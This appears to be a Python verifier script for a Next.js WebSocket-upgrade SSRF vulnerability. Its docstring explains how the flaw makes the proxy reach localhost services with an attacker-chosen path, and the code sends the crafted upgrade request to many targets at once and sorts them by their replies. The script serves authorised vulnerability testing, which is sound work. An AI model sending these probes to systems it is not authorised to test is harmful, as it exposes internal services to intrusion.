#!/usr/bin/env python3
"""
verify_ghsa_c4j6.py — In-band verifier for GHSA-c4j6-fc7j-m34r / CVE-2026-44578
(Next.js WebSocket-upgrade SSRF; affected: next >=13.4.13 <15.5.16, >=16.0.0 <16.2.5)

For authorized security testing only.

DETECTION MODEL (revised after empirical testing against next@15.5.15 vs 15.5.16):

The vulnerable code path in `resolveRoutes` treats any request URI containing
`//` (which is every absolute-form request-URI) as a "normalize repeated
slashes" case. It collapses the `//` to `/`, then the unpatched upgrade
handler in `router-server.ts` still proxies the result. The mangled target
(`http:/host:port/path` with one slash) loses its host, so Node's URL parser
gives `host=null`, and `http-proxy` falls back to `localhost:80` (HTTPS:443).
The practical SSRF surface is therefore ANY service listening on the Next.js
host's localhost:80 or localhost:443 — with an attacker-controlled path.

Because the connection never reaches an external host, an out-of-band canary
will not receive callbacks. Detection is instead done in-band by reading the
upgrade socket:

  - "Internal Server Error" in the response  -> VULNERABLE
        (Next's http-proxy error handler ran; only the pre-patch path
         enters that code branch.)
  - Response starts with "HTTP/1."           -> VULNERABLE + reachable
        (A service on the host's localhost actually answered the proxy.)
  - Empty response / clean close             -> LIKELY PATCHED / not Next /
                                                behind a reverse proxy that
                                                strips Upgrade
  - Anything else                            -> INCONCLUSIVE

Usage:
  python3 verify_ghsa_c4j6.py --target https://app1.example.com
  python3 verify_ghsa_c4j6.py --targets-file targets.txt --json
  cat targets.txt | python3 verify_ghsa_c4j6.py
"""

from __future__ import annotations

import argparse
import asyncio
import json
import secrets
import ssl
import sys
from urllib.parse import urlsplit


DEFAULT_TIMEOUT = 5.0
DEFAULT_CONCURRENCY = 10
DEFAULT_PROBE_PATH = "/x"  # arbitrary; becomes the path on localhost:80 of the target


def build_payload(absolute_uri: str, target_host_header: str) -> bytes:
    lines = [
        f"GET {absolute_uri} HTTP/1.1",
        f"Host: {target_host_header}",
        "Connection: Upgrade",
        "Upgrade: websocket",
        "Sec-WebSocket-Version: 13",
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==",
        "",
        "",
    ]
    return "\r\n".join(lines).encode("latin-1")


def parse_target(url: str) -> tuple[str, int, bool]:
    if "://" not in url:
        url = "http://" + url
    parts = urlsplit(url)
    host = parts.hostname
    if not host:
        raise ValueError(f"invalid target: {url}")
    is_tls = parts.scheme == "https"
    port = parts.port or (443 if is_tls else 80)
    return host, port, is_tls


def classify(snippet: str) -> str:
    """Map the raw bytes of the socket reply to a verdict."""
    if not snippet:
        return "likely_patched"
    if "Internal Server Error" in snippet:
        return "vulnerable"
    if snippet.startswith("HTTP/1."):
        return "vulnerable_proxy_succeeded"
    return "inconclusive"


async def probe_one(
    target: str,
    probe_path: str,
    timeout: float,
    verify_tls: bool,
) -> dict:
    token = secrets.token_hex(8)
    try:
        host, port, is_tls = parse_target(target)
    except ValueError as e:
        return {"target": target, "token": token, "status": "invalid",
                "verdict": "error", "error": str(e)}

    host_header = host if port in (80, 443) else f"{host}:{port}"
    # absolute-form request-URI; the path includes the token so log inspection
    # on a co-located localhost service can correlate the probe to its target
    absolute_uri = f"http://canary.invalid{probe_path}/{token}"
    payload = build_payload(absolute_uri, host_header)

    try:
        if is_tls:
            ctx = ssl.create_default_context()
            if not verify_tls:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx, server_hostname=host),
                timeout=timeout,
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
    except (asyncio.TimeoutError, OSError, ssl.SSLError) as e:
        return {"target": target, "token": token, "status": "connect_error",
                "verdict": "error", "error": str(e)}

    try:
        writer.write(payload)
        await writer.drain()
        try:
            data = await asyncio.wait_for(reader.read(4096), timeout=timeout)
        except asyncio.TimeoutError:
            data = b""
        snippet = data.decode("latin-1", "replace")
        verdict = classify(snippet)
        return {
            "target": target,
            "token": token,
            "status": "sent",
            "verdict": verdict,
            "response_snippet": snippet[:300].replace("\r", " ").replace("\n", " "),
        }
    except OSError as e:
        return {"target": target, "token": token, "status": "send_error",
                "verdict": "error", "error": str(e)}
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


async def run(targets, probe_path, concurrency, timeout, verify_tls):
    sem = asyncio.Semaphore(concurrency)

    async def bound(t):
        async with sem:
            return await probe_one(t, probe_path, timeout, verify_tls)

    return await asyncio.gather(*(bound(t) for t in targets))


def load_targets(args) -> list[str]:
    targets: list[str] = []
    if args.targets_file:
        with open(args.targets_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
    if args.target:
        targets.extend(args.target)
    if not targets and not sys.stdin.isatty():
        for line in sys.stdin:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)
    seen = set()
    out = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out


VERDICT_GLYPH = {
    "vulnerable": "VULN",
    "vulnerable_proxy_succeeded": "VULN+",
    "likely_patched": "OK?",
    "inconclusive": "????",
    "error": "ERR",
}


def main() -> int:
    p = argparse.ArgumentParser(
        description="In-band verifier for GHSA-c4j6-fc7j-m34r (Next.js WebSocket-upgrade SSRF)."
    )
    p.add_argument("--target", action="append", default=[],
                   help="A target (host:port or URL). Repeat for multiple.")
    p.add_argument("--targets-file",
                   help="File with one target per line (# comments allowed).")
    p.add_argument("--probe-path", default=DEFAULT_PROBE_PATH,
                   help="Path component used in the crafted request-URI. "
                        "Becomes the path on the target's localhost service. "
                        f"Default: {DEFAULT_PROBE_PATH}")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    p.add_argument("--insecure", action="store_true",
                   help="Skip TLS certificate verification for https targets.")
    p.add_argument("--json", action="store_true",
                   help="Emit JSON Lines instead of human-readable output.")
    args = p.parse_args()

    targets = load_targets(args)
    if not targets:
        p.error("provide --target, --targets-file, or pipe targets on stdin")

    results = asyncio.run(
        run(targets, args.probe_path, args.concurrency, args.timeout, not args.insecure)
    )

    for r in results:
        if args.json:
            print(json.dumps(r))
        else:
            tag = VERDICT_GLYPH.get(r["verdict"], r["verdict"])
            line = f"[{tag:>5}] target={r['target']:<50} verdict={r['verdict']}"
            if "response_snippet" in r and r["response_snippet"]:
                snip = r["response_snippet"][:80]
                line += f"  snippet={snip!r}"
            if "error" in r:
                line += f"  error={r['error']}"
            print(line)

    if not args.json:
        counts: dict[str, int] = {}
        for r in results:
            counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
        print()
        for verdict, n in sorted(counts.items()):
            print(f"  {verdict}: {n}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
